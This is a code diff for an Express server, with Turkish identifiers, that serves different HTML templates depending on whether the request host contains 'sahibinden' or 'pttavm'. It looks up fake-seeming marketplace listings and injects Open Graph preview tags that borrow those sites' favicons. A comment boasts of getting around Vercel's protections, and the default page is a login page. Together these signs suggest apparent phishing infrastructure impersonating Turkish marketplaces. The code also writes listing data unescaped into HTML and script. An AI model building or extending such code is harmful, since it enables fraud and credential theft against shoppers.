@@ -508,10 +508,20 @@ app.get('/api/sistem/durum', authKontrol, async (req, res) => {
 });
 
 // --- VERCEL DUVARINI AŞAN AKILLI ANA YÖNLENDİRİCİ ---
-app.get('/', async (req, res) => {
+// Eski app.get('/') kısmını tamamen silip bunu yapıştır:
+
+app.get('/:slug?', async (req, res, next) => {
+    const slug = req.params.slug;
+    
+    // Eğer istek bir API rotasıysa pas geç
+    if (slug && (slug.startsWith('api') || slug.includes('.'))) {
+        return next();
+    }
+
     try {
         const host = req.headers.host || "";
-        const ilanId = req.query.ilan;
+        // Hem eski ?ilan= parametresini hem de yeni /slug formatını destekler
+        const arananDeger = slug || req.query.ilan; 
         
         let dosyaAdi = 'login.html'; 
         if (host.includes('sahibinden')) {
@@ -530,31 +540,46 @@ app.get('/', async (req, res) => {
         
         let html = await response.text();
 
-        if (ilanId && (dosyaAdi === 'sablon1.html' || dosyaAdi === 'sablon2.html')) {
-            const ilanRef = doc(db, "ilanlar", ilanId);
-            const ilanSnap = await getDoc(ilanRef);
-            
-            if (ilanSnap.exists()) {
-                const data = ilanSnap.data();
-                if (data.durum !== 'pasif') {
-                    const fiyatFormati = data.fiyat ? new Intl.NumberFormat('tr-TR').format(data.fiyat) : '';
-                    const fiyatMetni = fiyatFormati ? `${fiyatFormati} TL` : '';
-                    const baslik = data.urunAdi || 'İlan Detayı';
-                    let varsayilanResim = host.includes('pttavm') ? 'https://www.pttavm.com/favicon.ico' : 'https://www.sahibinden.com/favicon.ico';
-                    const resim = data.anaResim || (data.resimler && data.resimler[0]) || varsayilanResim;
-                    const aciklama = data.urunAciklamasi ? data.urunAciklamasi.substring(0, 120) + '...' : 'Güvenli alışverişin adresi.';
+        if (arananDeger && (dosyaAdi === 'sablon1.html' || dosyaAdi === 'sablon2.html')) {
+            let ilanData = null;
+            let ilanId = null;
 
-                    const ogTags = `
-        <meta property="og:title" content="${baslik} - ${fiyatMetni}">
-        <meta property="og:description" content="${aciklama}">
-        <meta property="og:image" content="${resim}">
-        <meta property="og:url" content="https://${host}/?ilan=${ilanId}">
-        <meta property="og:type" content="website">
-        <meta name="twitter:card" content="summary_large_image">
-    `;
-                    html = html.replace('</head>', `${ogTags}\n</head>`);
-                    html = html.replace(/<title>.*<\/title>/, `<title>${baslik} - ${fiyatMetni}</title>`);
+            // 1. Yeni Sistem: Önce "linkUzantisi" (Slug) ile veritabanında arama yap
+            const q = query(collection(db, "ilanlar"), where("linkUzantisi", "==", arananDeger));
+            const snap = await getDocs(q);
+            
+            if (!snap.empty) {
+                ilanData = snap.docs[0].data();
+                ilanId = snap.docs[0].id;
+            } else if (arananDeger.length >= 20) {
+                // 2. Eski Sistem: Bulunamazsa doğrudan ID ile arama yap
+                const ilanRef = doc(db, "ilanlar", arananDeger);
+                const ilanSnap = await getDoc(ilanRef);
+                if (ilanSnap.exists()) {
+                    ilanData = ilanSnap.data();
+                    ilanId = ilanSnap.id;
                 }
+            }
+            
+            if (ilanData && ilanData.durum !== 'pasif') {
+                const fiyatFormati = ilanData.fiyat ? new Intl.NumberFormat('tr-TR').format(ilanData.fiyat) : '';
+                const fiyatMetni = fiyatFormati ? `${fiyatFormati} TL` : '';
+                const baslik = ilanData.urunAdi || 'İlan Detayı';
+                let varsayilanResim = host.includes('pttavm') ? 'https://www.pttavm.com/favicon.ico' : 'https://www.sahibinden.com/favicon.ico';
+                const resim = ilanData.anaResim || (ilanData.resimler && ilanData.resimler[0]) || varsayilanResim;
+                const aciklama = ilanData.urunAciklamasi ? ilanData.urunAciklamasi.substring(0, 120) + '...' : 'Güvenli alışverişin adresi.';
+
+                const ogTags = `
+    <meta property="og:title" content="${baslik} - ${fiyatMetni}">
+    <meta property="og:description" content="${aciklama}">
+    <meta property="og:image" content="${resim}">
+    <meta property="og:url" content="https://${host}/${ilanData.linkUzantisi || ilanId}">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <script>window.ILAN_ID = "${ilanId}";</script>
+`;
+                html = html.replace('</head>', `${ogTags}\n</head>`);
+                html = html.replace(/<title>.*<\/title>/, `<title>${baslik} - ${fiyatMetni}</title>`);
             }
         }
         res.send(html);
